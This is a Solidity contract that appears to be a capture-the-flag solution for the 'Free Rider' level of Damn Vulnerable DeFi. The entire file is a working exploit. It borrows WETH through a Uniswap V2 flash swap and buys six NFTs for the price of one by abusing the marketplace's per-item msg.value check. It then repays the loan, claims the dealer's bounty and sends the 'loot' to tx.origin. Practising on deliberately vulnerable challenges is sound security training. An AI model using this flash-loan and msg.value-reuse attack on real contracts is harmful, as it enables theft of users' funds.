//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "./FreeRiderNFTMarketplace.sol";
import "./FreeRiderBuyer.sol";
import "../DamnValuableNFT.sol";
import "../WETH9.sol";

contract FreeRiderExploit is IUniswapV2Callee {
    IUniswapV2Pair public immutable wethDvtPair;
    IFreeRiderNFTMarketplace public immutable nftMarketplace;
    IWETH9 public immutable weth;
    address public immutable dealer;

    constructor(
        IFreeRiderNFTMarketplace _nftMarketplace,
        IUniswapV2Pair _wethDvtPair,
        address _dealer,
        IWETH9 _weth
    ) {
        wethDvtPair = _wethDvtPair;
        nftMarketplace = _nftMarketplace;
        dealer = _dealer;
        weth = _weth;
    }

    function attack() external {
        // 1. get an optimistically transferred flash loan from uniV2 WETH-DVT pair
        wethDvtPair.swap(15 ether, 0, address(this), new bytes(1));
    }

    function uniswapV2Call(
        address,
        uint256 amount0,
        uint256,
        bytes calldata
    ) external override {
        require(msg.sender == address(wethDvtPair), "Unauthorized!");

        uint256 wethBorrowed = amount0;
        uint256 wethToRepay = ((31 * wethBorrowed) / 10000) + wethBorrowed; // add 0.31% to repayment as flashloan fee

        // 2. convert WETH borrowed to ETH -> buy NFTs
        weth.withdraw(wethBorrowed);

        // 3. attack the contract by buying 6 NFTs for the *refundable price of 1 NFT
        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 i = 0; i < 6; ) {
            tokenIds[i] = i;
            unchecked {
                ++i;
            }
        }
        nftMarketplace.buyMany{value: wethBorrowed}(tokenIds);

        // 4. convert ETH to WETH -> repay flashloan from uniV2 pair
        weth.deposit{value: wethToRepay}();
        weth.transfer(msg.sender, weth.balanceOf(address(this)));

        // 5. collect payout from dealer contract
        uint256 tokensLength = tokenIds.length;
        for (uint256 i = 0; i < tokensLength; ) {
            nftMarketplace.token().safeTransferFrom(
                address(this),
                dealer,
                tokenIds[i]
            );

            unchecked {
                ++i;
            }
        }

        // 6. Transfer loot to owner
        (bool success, ) = tx.origin.call{value: address(this).balance}("");
        require(success, "transfer failed!");
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}

interface IFreeRiderNFTMarketplace {
    function token() external view returns (DamnValuableNFT);

    function offerMany(uint256[] calldata tokenIds, uint256[] calldata prices)
        external;

    function buyMany(uint256[] calldata tokenIds) external payable;
}

interface IWETH9 {
    function withdraw(uint256 amount0) external;

    function deposit() external payable;

    function transfer(address dst, uint256 wad) external returns (bool);

    function balanceOf(address addr) external returns (uint256);
}
